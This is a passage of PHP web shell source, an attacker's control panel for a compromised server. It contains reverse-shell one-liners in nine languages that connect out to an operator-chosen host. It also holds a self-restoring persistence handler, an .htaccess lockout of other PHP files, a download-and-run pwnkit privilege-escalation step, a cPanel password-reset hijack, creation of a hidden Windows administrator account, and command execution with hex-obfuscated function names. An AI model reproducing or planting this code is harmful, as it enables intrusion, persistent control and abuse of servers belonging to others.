t+='<tr><td style="color:var(--tx2)">'+(i+1)+'</td><td><a href="http://'+dm.domain+'" target="_blank" style="font-family:var(--mn);font-size:11px">'+dm.domain+'</a></td><td style="'+cc+';font-size:11px">'+dm.cms+'</td><td style="color:'+sc+';font-size:11px;font-weight:600">'+dm.status+'</td></tr>';});
t+='</tbody></table></div>';$('#domains-content').html(t);
},error:function(x,st){$('#domains-content').html('<div style="color:var(--rd);padding:20px;text-align:center"><i class="fa-solid fa-xmark" style="font-size:20px"></i><p style="margin-top:8px">Request gagal: '+(st==='timeout'?'Timeout':'Network error')+'</p></div>');}});}

</script>
</body>
</html>
<?php
/* === POST HANDLERS === */
 
/* submitwp removed - use WP Panel instead */
 
if (isset($_GET['unlockshell'])){if(cmd("killall -9 php")&&cmd("pkill -9 php")){success();}else{failed();}}
 
if (isset($_POST['submit-bc'])){
    $HostServer=$_POST['backconnect-host'];$PortServer=$_POST['backconnect-port'];
    if($_POST['gecko-bc']=="perl"){echo cmd('perl -e \'use Socket;$i="'.$HostServer.'";$p='.$PortServer.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'.$fungsi[16].'("/bin/sh -i");};\'');}
    else if($_POST['gecko-bc']=="python"){echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$HostServer.'",'.$PortServer.'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');}
    else if($_POST['gecko-bc']=="ruby"){echo cmd('ruby -rsocket -e\'f=TCPSocket.open("'.$HostServer.'",'.$PortServer.').to_i;'.$fungsi[16].' sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');}
    else if($_POST['gecko-bc']=="bash"){echo cmd('bash -i >& /dev/tcp/'.$HostServer.'/'.$PortServer.' 0>&1');}
    else if($_POST['gecko-bc']=="php"){echo cmd('php -r \'$sock=fsockopen("'.$HostServer.'",'.$PortServer.');'.$fungsi[16].'("/bin/sh -i <&3 >&3 2>&3");\'');}
    else if($_POST['gecko-bc']=="nc"){echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '.$HostServer.' '.$PortServer.' >/tmp/f');}
    else if($_POST['gecko-bc']=="sh"){echo cmd('sh -i >& /dev/tcp/'.$HostServer.'/'.$PortServer.' 0>&1');}
    else if($_POST['gecko-bc']=="xterm"){echo cmd('xterm -display '.$HostServer.':'.$PortServer);}
    else if($_POST['gecko-bc']=="golang"){echo cmd('echo \'package main;import"os/'.$fungsi[16].'";import"net";func main(){c,_:=net.Dial("tcp","'.$HostServer.':'.$PortServer.'");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');}
}
 
if (isset($_GET['lockshell'])){
    $curFile=trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));$TmpNames=$fungsi[31]();
    if(file_exists($TmpNames.'/.sessions/.'.$fungsi[33]($fungsi[0]().remove_dot($curFile).'-handler'))&&file_exists($TmpNames.'/.sessions/.'.$fungsi[33]($fungsi[0]().remove_dot($curFile).'-text'))){
    cmd('rm -rf '.$TmpNames.'/.sessions/.'.$fungsi[33]($fungsi[0]().remove_dot($curFile).'-text'));
    cmd('rm -rf '.$TmpNames.'/.sessions/.'.$fungsi[33]($fungsi[0]().remove_dot($curFile).'-handler'));}
    mkdir($TmpNames."/.sessions");
    cmd("cp $curFile ".$TmpNames."/.sessions/.".$fungsi[33]($fungsi[0]().remove_dot($curFile).'-text'));
    chmod($curFile,0444);
    $handler='<?php
@ini_set("max_execution_time",0);
while(True){
if(!file_exists("'.__DIR__.'"))mkdir("'.__DIR__.'");
if(!file_exists("'.$fungsi[0]().'/'.$curFile.'")){
$text='.$fungsi[33].'(file_get_contents("'.$TmpNames.'/.sessions/.'.$fungsi[33]($fungsi[0]().remove_dot($curFile).'-text').'"));
file_put_contents("'.$fungsi[0]().'/'.$curFile.'",'.$fungsi[32].'($text));}
if(gecko_perm("'.$fungsi[0]().'/'.$curFile.'")!=0444)chmod("'.$fungsi[0]().'/'.$curFile.'",0444);
if(gecko_perm("'.__DIR__.'")!=0555)chmod("'.__DIR__.'",0555);}
function gecko_perm($f){return substr(sprintf("%o",fileperms($f)),-4);}';
    $hndlers=$fungsi[28]($TmpNames."/.sessions/.".$fungsi[33]($fungsi[0]().remove_dot($curFile).'-handler')."",$handler);
    if($hndlers){cmd(PHP_BINARY.$TmpNames.'/.sessions/.'.$fungsi[33]($fungsi[0]().remove_dot($curFile).'-handler').' > /dev/null 2>/dev/null &');success();}
    else{failed();}
}
 
if (isset($_POST['gecko-up-submit'])){
    $namaFilenya=$_FILES['gecko-upload']['name'];$tmpName=$_FILES['gecko-upload']['tmp_name'];
    $dest=$fungsi[0]()."/".$namaFilenya;
    if(strpos(realpath(dirname($dest)).'/', realpath($fungsi[0]()).'/') !== 0) { failed(); }
    elseif($fungsi[29]($tmpName,$dest)){
        $ext=strtolower(pathinfo($namaFilenya,PATHINFO_EXTENSION));
        @chmod($dest, $ext==='php'?0755:0644);
        success();
    }else{failed();}
}

if (isset($_POST['gecko-zip-submit'])){
    $zipFile=$_FILES['gecko-zip-upload'];
    if($zipFile && $zipFile['error']===0 && class_exists('ZipArchive')){
        $zip=new ZipArchive();
        if($zip->open($zipFile['tmp_name'])===TRUE){
            $dest=$fungsi[0]();
            for($i=0;$i<$zip->numFiles;$i++){
                $entry=$zip->getNameIndex($i);
                if($entry===false||str_ends_with($entry,'/'))continue;
                $norm=str_replace('\\','/',$entry);$norm=ltrim($norm,'/');
                if(strpos($norm,'..')!==false)continue;
                $target=$dest.'/'.$norm;$tdir=dirname($target);
                if(!is_dir($tdir))@mkdir($tdir,0755,true);
                $in=$zip->getStream($entry);
                if(!$in)continue;
                $out=@fopen($target,'wb');
                if(!$out){fclose($in);continue;}
                stream_copy_to_stream($in,$out);fclose($in);fclose($out);
                $ext=strtolower(pathinfo($norm,PATHINFO_EXTENSION));
                @chmod($target,$ext==='php'?0755:0644);
            }
            $zip->close();success();
        }else{failed();}
    }else{failed();}
}
 
if (isset($_GET['destroy'])){
    $DOC_ROOT=$_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"];
    $CurrentFile=trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
    if($fungsi[4]($DOC_ROOT)){
    $htaccess='<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
Deny from all
</FilesMatch>
<FilesMatch "^('.$CurrentFile.'|index.php|wp-config.php|wp-includes.php)$">
Allow from all
</FilesMatch>
<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
Allow from all
</FilesMatch>';
    $put_htt=$fungsi[28]($DOC_ROOT."/.htaccess",$htaccess);
    if($put_htt){success();}else{failed();}
    }else{failed();}
}
 
if (isset($_POST['save-editor'])){
    $save=$fungsi[28]($fungsi[0]()."/".unx($_GET['f']),$_POST['code-editor']);
    if($save){success();}else{failed();}
}
 
/* adminer removed - replaced by built-in MySQL Browser */
 
if ($_GET['terminal']=="root"){
    if(!$fungsi[3]('pwnkit')&&$fungsi[4]($fungsi[0]())){
        $fungsi[28]("pwnkit",$fungsi[11]("https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit"));
        cmd('chmod +x pwnkit');
        cmd('./pwnkit "id" > .mad-root 2>&1');
        if(!isset($_GET['rootinit'])){
            echo '<meta http-equiv="refresh" content="1;url=?'.$_NONCE_PREFIX.'d='.hx($fungsi[0]()).'&terminal=root&rootinit=1">';
        }
    }
}
 
if (isset($_POST['submit-action'])){
    $items=$_POST['check'];
    if($_POST['gecko-select']=="delete"){
        foreach($items as $it){$repl=str_replace("\\","/",$fungsi[0]());$fd=$repl."/".$it;
        if(is_dir($fd)||is_file($fd)){$rmdir=unlinkDir($fd);$rmfile=$fungsi[24]($fd);
        if($rmdir||$rmfile){success();}else if($rmdir&&$rmfile){success();}else{failed();}}}
    }else if($_POST['gecko-select']=='unzip'){
        foreach($items as $it){$repl=str_replace("\\","/",$fungsi[0]());$fd=$repl."/".$it;
        if(ExtractArchive($fd,$repl.'/')==true){success();}else{failed();}}
    }else if($_POST['gecko-select']=='zip'){
        foreach($items as $it){$repl=str_replace("\\","/",$fungsi[0]());$fd=$repl."/".$it;
        if($fungsi[3]($fd)){compressToZip($fd,pathinfo($fd,PATHINFO_FILENAME).".zip");}}
    }
}
 
if (isset($_POST['submit'])){
    if($_POST['resetcp']==true){$emailCp=$_POST['resetcp'];$path0cp=dirname($_SERVER['DOCUMENT_ROOT']);$pathcp=$path0cp."/.cpanel/contactinfo";
    $contactinfo='"email" : "'.$emailCp.'"';
    if($fungsi[3]($pathcp)){$fungsi[28]($pathcp,$contactinfo);
    echo '<meta http-equiv="refresh" content="0;url='.$_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['SERVER_NAME'].':2083/resetpass?start=1">';}
    else{failed();}}
    if($_POST['create_folder']==true){$NamaFolder=$fungsi[12]($_POST['create_folder']);if($NamaFolder){success();}else{failed();}}
    else if($_POST['create_file']==true){$namaFile=$fungsi[13]($_POST['create_file']);if($namaFile){success();}else{failed();}}
    else if($_POST['renameFile']==true){$renameFile=$fungsi[15](unx($_GET['re']),$_POST['renameFile']);if($renameFile){success();}else{failed();}}
    else if($_POST['chFile']){$chFiles=$fungsi[30](unx($_GET['ch']),intval($_POST['chFile'],8));if($chFiles){success();}else{failed();}}
    /* Add User removed */
    else if($_POST['lockfile']==true){
        $flesName=$_POST['lockfile'];$TmpNames=$fungsi[31]();
        if(file_exists($TmpNames.'/.sessions/.'.$fungsi[33]($fungsi[0]().remove_dot($flesName).'-handler'))&&file_exists($TmpNames.'/.sessions/.'.remove_dot($flesName).'-text')){
        cmd('rm -rf '.$TmpNames.'/.sessions/.'.$fungsi[33]($fungsi[0]().remove_dot($flesName).'-text-file'));
        cmd('rm -rf '.$TmpNames.'/.sessions/.'.$fungsi[33]($fungsi[0]().remove_dot($flesName).'-handler'));}
        mkdir($TmpNames."/.sessions");
        cmd("cp $flesName ".$TmpNames."/.sessions/.".$fungsi[33]($fungsi[0]().remove_dot($flesName).'-text-file'));
        cmd("chmod 444 ".$flesName);
        $handler='<?php
@ini_set("max_execution_time",0);
while(True){
if(!file_exists("'.$fungsi[0]().'"))mkdir("'.$fungsi[0]().'");
if(!file_exists("'.$fungsi[0]().'/'.$flesName.'")){
$text='.$fungsi[33].'(file_get_contents("'.$TmpNames.'/.sessions/.'.$fungsi[33]($fungsi[0]().remove_dot($flesName).'-text-file').'"));
file_put_contents("'.$fungsi[0]().'/'.$flesName.'",'.$fungsi[32].'($text));}
if(gecko_perm("'.$fungsi[0]().'/'.$flesName.'")!=0444)chmod("'.$fungsi[0]().'/'.$flesName.'",0444);
if(gecko_perm("'.$fungsi[0]().'")!=0555)chmod("'.$fungsi[0]().'",0555);}
function gecko_perm($f){return substr(sprintf("%o",fileperms($f)),-4);}';
        $hndlers=$fungsi[28]($TmpNames."/.sessions/.".$fungsi[33]($fungsi[0]().remove_dot($flesName).'-handler')."",$handler);
        if($hndlers){cmd(PHP_BINARY.$TmpNames.'/.sessions/.'.$fungsi[33]($fungsi[0]().remove_dot($flesName).'-handler').' > /dev/null 2>/dev/null &');success();}
        else{failed();}}
    else if($_POST['add-rdp']==True){$userRDP=$_POST['add-rdp'];$passRDP=$_POST['add-rdp-pass'];
        if(stristr(PHP_OS,"WIN")){$procRDP=cmd("net user ".$userRDP." ".$passRDP." /add");
        if($procRDP){cmd("net localgroup administrators ".$userRDP." /add");success();}else{failed();}}
        else{failed();}}
    else if($_POST['mail-from-smtp']==True){
        $emailFrom=$_POST['mail-from-smtp'];$emailTo=$_POST['mail-to-smtp'];$emailSubject=$_POST['mailto-subject'];$messageMail=$_POST['message-smtp'];
        $headersMail='From: '.$emailFrom.''."\r\n".'Reply-To: '.$emailFrom.''."\r\n".'X-Mailer: PHP/'.phpversion();
        $procMailSmTp=mail($emailTo,$emailSubject,$messageMail,$headersMail);
        if($procMailSmTp){success();}else{failed();}}
}
 
if ($_GET['response']=="success"){echo "<script>Swal.fire({icon:'success',title:'Success',text:'Operation completed!',showConfirmButton:false,timer:2000,timerProgressBar:true,background:'#12161e',color:'#c5cdd8'})</script>";}
else if ($_GET['response']=="failed"){echo "<script>Swal.fire({icon:'error',title:'Failed',text:'Something went wrong!',showConfirmButton:false,timer:3000,timerProgressBar:true,background:'#12161e',color:'#c5cdd8'})</script>";}
 
function success(){echo '<meta http-equiv="refresh" content="0;url=?'.$GLOBALS['_NONCE_PREFIX'].'d='.hx($GLOBALS['fungsi'][0]()).'&response=success">';}
function failed(){echo '<meta http-equiv="refresh" content="0;url=?'.$GLOBALS['_NONCE_PREFIX'].'d='.hx($GLOBALS['fungsi'][0]()).'&response=failed">';}
 
function formatSize($bytes){
    $types=['<span class="fs">B</span>','<span class="fs">KB</span>','<span class="fs">MB</span>','<span class="fs">GB</span>','<span class="fs">TB</span>'];
    for($i=0;$bytes>=1024&&$i<(count($types)-1);$bytes/=1024,$i++);
    return(round($bytes,2)." ".$types[$i]);
}
 
function hx($n){$y='';for($i=0;$i<strlen($n);$i++){$y.=dechex(ord($n[$i]));}return $y;}
function unx($y){$n='';for($i=0;$i<strlen($y)-1;$i+=2){$n.=chr(hexdec($y[$i].$y[$i+1]));}return $n;}
 
function suggest_exploit(){$uname=$GLOBALS['fungsi'][8]();$xplod=explode(" ",$uname);$xpld=explode("-",$xplod[2]);$pl=explode(".",$xpld[0]);return $pl[0].".".$pl[1].".".$pl[2];}
 
function s(){
    $d0mains=@$GLOBALS['fungsi'][7]("/etc/named.conf",false);
    if(!$d0mains){$dom="<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";$GLOBALS["need_to_update_header"]="true";}
    else{$count=0;foreach($d0mains as $d0main){if(@strstr($d0main,"zone")){preg_match_all('#zone "(.*)"#',$d0main,$domains);flush();
    if(strlen(trim($domains[1][0]))>2){flush();$count++;}}}$dom="$count Domain";}
    return $dom;
}
 
function cmd($in,$re=false){
    $out='';try{if($re)$in=$in." 2>&1";
    if(function_exists("\x65\x78\x65\x63")){@$GLOBALS['fungsi'][16]($in,$out);$out=@join("\n",$out);}
    elseif(function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")){ob_start();@$GLOBALS['fungsi'][17]($in);$out=ob_get_clean();}
    elseif(function_exists("\x73\x79\x73\x74\x65\x6d")){ob_start();@$GLOBALS['fungsi'][18]($in);$out=ob_get_clean();}
    elseif(function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")){$out=$GLOBALS['fungsi'][19]($in);}
    elseif(function_exists("\x70\x6f\x70\x65\x6e")&&function_exists("\x70\x63\x6c\x6f\x73\x65")){
    if(is_resource($f=@$GLOBALS['fungsi'][20]($in,"r"))){$out="";while(!@feof($f))$out.=fread($f,1024);$GLOBALS['fungsi'][21]($f);}}
    elseif(function_exists("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")){$pipes=[];$process=@$GLOBALS['fungsi'][23]($in.' 2>&1',[["pipe","w"],["pipe","w"],["pipe","w"]],$pipes,null);$out=@$GLOBALS['fungsi'][22]($pipes[1]);}
    }catch(Exception $e){}return $out;
}
 
function winpwd(){return str_replace("\\","/",$GLOBALS['fungsi'][0]());}
 
function compressToZip($sourceFile,$zipFilename){
    $zip=new ZipArchive();
    if($zip->open($zipFilename,ZipArchive::CREATE)===TRUE){$zip->addFile($sourceFile,basename($sourceFile));$zip->close();success();}
    else{failed();}
}
 
function remove_slash($val){$tex=str_replace("/","",$val);$tex1=str_replace(":","",$tex);$tex2=str_replace("_","",$tex1);$tex3=str_replace(" ","",$tex2);$tex4=str_replace(".","",$tex3);return $tex4;}
 
function unlinkDir($dir){
    $dirs=[$dir];$files=[];
    for($i=0;;$i++){if(isset($dirs[$i]))$dir=$dirs[$i];else break;
    if($openDir=opendir($dir)){while($readDir=@readdir($openDir)){if($readDir!="."&&$readDir!=".."){
    if($GLOBALS['fungsi'][2]($dir."/".$readDir)){$dirs[]=$dir."/".$readDir;}else{$files[]=$dir."/".$readDir;}}}}}
    foreach($files as $file){$GLOBALS['fungsi'][24]($file);}
    $dirs=array_reverse($dirs);foreach($dirs as $dir){$GLOBALS['fungsi'][25]($dir);}
}
 
function remove_dot($file){$FILES=$file;$pch=explode(".",$FILES);return $pch[0];}
 
function windowsDriver(){
    $winArr=['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','V','W','X','Y','Z'];
    foreach($winArr as $winNum=>$winVal){if(is_dir($winVal.":/")){echo "<a style='color:var(--or);font-weight:bold;' href='?".$GLOBALS['_NONCE_PREFIX']."d=".hx($winVal.":/")."'>[ ".$winVal." ] </a>&nbsp;";}}
}
 
function namaPanjang($value){$namaNya=$value;if(strlen($namaNya)>30){return substr($namaNya,0,30)."...";}else{return $value;}}
 
function extractArchive($archiveFilename,$extractPath){
    $zip=new ZipArchive();
    if($zip->open($archiveFilename)===TRUE){$zip->extractTo($extractPath);$zip->close();return true;}
    else{return false;}
}
 
function perms($file){
    $perms=$GLOBALS['fungsi'][6]($file);
    if(($perms&0xC000)==0xC000)$info='s';elseif(($perms&0xA000)==0xA000)$info='l';
    elseif(($perms&0x8000)==0x8000)$info='-';elseif(($perms&0x6000)==0x6000)$info='b';
    elseif(($perms&0x4000)==0x4000)$info='d';elseif(($perms&0x2000)==0x2000)$info='c';
    elseif(($perms&0x1000)==0x1000)$info='p';else $info='u';
    $info.=(($perms&0x0100)?'r':'-');$info.=(($perms&0x0080)?'w':'-');
    $info.=(($perms&0x0040)?(($perms&0x0800)?'s':'x'):(($perms&0x0800)?'S':'-'));
    $info.=(($perms&0x0020)?'r':'-');$info.=(($perms&0x0010)?'w':'-');
    $info.=(($perms&0x0008)?(($perms&0x0400)?'s':'x'):(($perms&0x0400)?'S':'-'));
    $info.=(($perms&0x0004)?'r':'-');$info.=(($perms&0x0002)?'w':'-');
    $info.=(($perms&0x0001)?(($perms&0x0200)?'t':'x'):(($perms&0x0200)?'T':'-'));
    return $info;
}
exit;
